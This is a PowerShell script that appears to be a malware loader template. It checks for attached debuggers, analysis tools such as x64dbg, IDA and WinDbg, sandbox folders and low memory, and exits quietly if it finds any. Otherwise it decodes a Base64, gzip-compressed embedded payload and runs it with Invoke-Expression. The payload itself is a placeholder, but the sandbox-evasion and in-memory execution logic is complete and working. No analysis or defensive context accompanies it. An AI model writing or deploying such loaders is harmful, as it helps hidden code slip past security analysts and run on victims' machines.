# Anti-analysis checks
function Test-IsDebugger {
    try {
        $debugger = [System.Diagnostics.Debugger]::IsAttached
        if ($debugger) { return $true }
        
        # Check for common debugger processes
        $debuggers = @('x64dbg', 'x32dbg', 'ollydbg', 'ida64', 'ida', 'windbg')
        $processes = Get-Process | Where-Object { $_.ProcessName -in $debuggers }
        if ($processes) { return $true }
        
        return $false
    } catch {
        return $false
    }
}

function Test-IsSandbox {
    try {
        # Check for common sandbox artifacts
        $sandbox_artifacts = @(
            'C:\sample',
            'C:\malware',
            'C:\virus',
            'C:\analysis'
        )
        
        foreach ($artifact in $sandbox_artifacts) {
            if (Test-Path $artifact) { return $true }
        }
        
        # Check for low RAM (common in sandboxes)
        $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
        if ($ram -lt 2GB) { return $true }
        
        return $false
    } catch {
        return $false
    }
}

# Main execution
try {
    Write-Host "Starting script execution..." -ForegroundColor Green
    
    # Skip if in debugger or sandbox
    if (Test-IsDebugger -or Test-IsSandbox) {
        Write-Host "Debugger or sandbox detected, exiting..." -ForegroundColor Red
        exit
    }
    
    Write-Host "Loading encoded payload..." -ForegroundColor Yellow
    $encoded = "PAYLOAD_PLACEHOLDER"
    
    Write-Host "Decoding Base64..." -ForegroundColor Yellow
    try {
        $compressed = [System.Convert]::FromBase64String($encoded)
        Write-Host "Base64 decode successful" -ForegroundColor Green
    } catch {
        Write-Host "Base64 decode failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Setting up decompression..." -ForegroundColor Yellow
    try {
        $decompressed = New-Object System.IO.MemoryStream
        $decompressed.Write($compressed, 0, $compressed.Length)
        $decompressed.Seek(0, 0) | Out-Null
        Write-Host "MemoryStream setup successful" -ForegroundColor Green
    } catch {
        Write-Host "MemoryStream setup failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Creating GzipStream..." -ForegroundColor Yellow
    try {
        $gzipStream = New-Object System.IO.Compression.GzipStream($decompressed, [System.IO.Compression.CompressionMode]::Decompress)
        Write-Host "GzipStream creation successful" -ForegroundColor Green
    } catch {
        Write-Host "GzipStream creation failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Reading decompressed data..." -ForegroundColor Yellow
    try {
        $reader = New-Object System.IO.StreamReader($gzipStream)
        $script = $reader.ReadToEnd()
        Write-Host "Data read successful" -ForegroundColor Green
    } catch {
        Write-Host "Data read failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Cleaning up streams..." -ForegroundColor Yellow
    try {
        $reader.Close()
        $gzipStream.Close()
        $decompressed.Close()
        Write-Host "Stream cleanup successful" -ForegroundColor Green
    } catch {
        Write-Host "Stream cleanup failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Executing script..." -ForegroundColor Yellow
    try {
        Invoke-Expression $script
        Write-Host "Script execution completed" -ForegroundColor Green
    } catch {
        Write-Host "Script execution failed: $_" -ForegroundColor Red
        throw
    }
    
} catch {
    Write-Host "Error occurred: $_" -ForegroundColor Red
    Write-Host "Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
    exit
} 